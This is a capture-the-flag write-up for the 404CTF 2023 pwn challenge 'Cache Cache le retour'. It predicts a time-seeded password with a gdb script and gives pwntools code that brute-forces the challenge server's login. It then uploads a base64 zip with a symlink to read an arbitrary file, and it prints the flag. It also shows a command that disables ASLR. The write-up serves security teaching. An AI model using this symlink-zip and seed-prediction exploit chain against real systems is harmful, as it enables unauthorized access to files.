---
title: CTFs | 404CTF2023 | Cache Cache Le Retour
author: Kaiba_404
date: 2023-06-05
categories: [CTFs, 404CTF2023, Cache Cache Le Retour]
tags: [CTF, 404CTF2023, pwn]
permalink: /CTFs/404CTF2023/pwn/cachecacheleretour
---

# Cache Cache le retour

![cache-cache-chall](https://github.com/CongKhaiNGUYEN/CTF/assets/61443497/61ac3663-27cb-4b5f-a960-f0aac9df459e)

Using the commands `file cache_cache_le_retour` and `checksec cache_cache_le_retour` to get some more infomation,

```bash
file cache_cache_le_retour 
cache_cache_le_retour: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=d574568517100e5aa82bc0cc539ef23a08e43dd3, stripped

checksec cache_cache_le_retour
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

```

Use Ghidra to read the code. Since the binary file has been stripped, it may be challenging to comprehend the code. As a solution, I decided to rename some functions to enhance the code's readability. The modified function names are displayed in the image below.

![func_name_chache](https://github.com/CongKhaiNGUYEN/CTF/assets/61443497/43956ad6-eb89-45fa-86f0-7ad970e0391e)

**The function main**

![main_cache_cache](https://github.com/CongKhaiNGUYEN/CTF/assets/61443497/aa32515f-57a5-4bbe-9404-c20ac8269b57)

From the code, it is evident that the password is randomly generated each time the ELF file is executed. The rand() function is utilized to generate a pseudo-random number, with the seed being based on the current timestamps.

Understanding this, we can recreate the password generation process by using the same binary file and providing a seed based on future timestamps, such as the next 30 seconds or more. By generating the password using this approach, we can then attempt to "brute force" the server's password by trying the generated passwords every second until we succeed.

The code below will have us to get the generated password by using gdb script:

```shell
set disassembly-flavor intel

break *0x5555554016a5 # just before the srand() function
commands
    silent
    print($rax)
    set $rax += 33 # add 33s into the current timestamps
    print($rax)
    continue
end

break *0x5555554016ff # just after the loop which generated the password
commands
    silent
    set $pass = (char *) $rbp -0x40 # get the password in the memory
    print($pass)
    quit
end

run
```

Before running this script, we must temporarily disable ASLR (Address space layout randomization) to get the same address each time we launch the ELF file. By using this command \
`echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`

The breakpoints are put at the instructions that are in the red box in the image below

![br_point](https://github.com/CongKhaiNGUYEN/CTF/assets/61443497/6c1fc56e-7b86-407b-82ab-55bd2acb9b56)

Running the script:

```shell
gdb-peda$ source auto_gdb.gdb 
Breakpoint 1 at 0x5555554016a5
Breakpoint 2 at 0x5555554016ff
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
$1 = 0x64818bc0
$2 = 0x64818be1
$3 = 0x7fffffffdcb0 "[FG/9y>frk}>G18bcac["
```

==> password = `[FG/9y>frk}>G18bcac[`

Code for "brute forcing" the access:

```python

from pwn import *
import time

while True:


    p = process("./cache_cache_le_retour")
    # p = remote("challenges.404ctf.fr",31725)


    password = b'vE79ekVZPFpz7JTyW8EZ'

    p.recvuntil(b"mot de passe ?\n")
    p.sendline(password)

    sms = p.recv()
    print(sms.decode())

p.interactive()
```

After successful with password, the program will call `give_a_gift` function (name given by me) as shown below

![give_a_gift](https://github.com/CongKhaiNGUYEN/CTF/assets/61443497/deab306f-6332-421b-bfc7-6965bb4278af)

This function takes a base64-encoded string as input and saves it as a file named "mystere.zip". Subsequently, it extracts the contents of this file to access the "surprise.txt" file. This indicates that we may be able to exploit the functionality by using symlinks within the "surprise.txt" file, allowing us to read the contents of arbitrary files after uploading them to the server.

We can also see the PS inside the description of the chall. There was something in the sale_au_tresor, so I decided to create a symlink from mystere.txt to the salle_au_tresor.
By using the commands below we will get the base64 file and ready for exploiting
![PS_cache_cahe](https://github.com/CongKhaiNGUYEN/CTF/assets/61443497/67161fe4-719e-4340-a471-d50909b44951)

```shell
$ ln -s salle_au_tresor surprise.txt
$ zip --symlinks mystere.zip surprise.txt
$ cat mystere.zip | base64 

UEsDBAoAAAAAAKN4t1aLoRhuDwAAAA8AAAAMABwAc3VycHJpc2UudHh0VVQJAAMBumxkAbpsZHV4CwABBOgDAAAE6AMAAHNhbGxlX2F1X3RyZXNvclBLAQIeAwoAAAAAAKN4t1aLoRhuDwAAAA8AAAAMABgAAAAAAAAAAAD/oQAAAABzdXJwcmlzZS50eHRVVAUAAwG6bGR1eAsAAQToAwAABOgDAABQSwUGAAAAAAEAAQBSAAAAVQAAAAAA
```

## The complete code

```python
from pwn import *
import time

while True:


    # p = process("./cache_cache_le_retour")
    p = remote("challenges.404ctf.fr",31725)


    password = b'vE79ekVZPFpz7JTyW8EZ'

    p.recvuntil(b"mot de passe ?\n")
    p.sendline(password)

    sms = p.recv()

    if b'Je me vois au regret de refuser' in sms:
        p.close()
        time.sleep(0.6)
        continue  
    gif = b"UEsDBAoAAAAAAKN4t1aLoRhuDwAAAA8AAAAMABwAc3VycHJpc2UudHh0VVQJAAMBumxkAbpsZHV4CwABBOgDAAAE6AMAAHNhbGxlX2F1X3RyZXNvclBLAQIeAwoAAAAAAKN4t1aLoRhuDwAAAA8AAAAMABgAAAAAAAAAAAD/oQAAAABzdXJwcmlzZS50eHRVVAUAAwG6bGR1eAsAAQToAwAABOgDAABQSwUGAAAAAAEAAQBSAAAAVQAAAAAA"
    p.sendline(gif)
    result = p.recvall()

    with open("remote_flag.txt", "wb") as binary_file:

        binary_file.write(result)
        break
print(result)
print('terminate')
p.interactive()

```

**Result**
```shell

[*] Closed connection to challenges.404ctf.fr port 31725
[+] Opening connection to challenges.404ctf.fr on port 31725: Done
[+] Receiving all data: Done (60B)
[*] Closed connection to challenges.404ctf.fr port 31725
b'404CTF{UN_CH3V41_D3_7r013_P0Ur_3NV4H1r_14_54113_4U_7r350r}\n\n'
```

**Flag:**  `404CTF{UN_CH3V41_D3_7r013_P0Ur_3NV4H1r_14_54113_4U_7r350r}`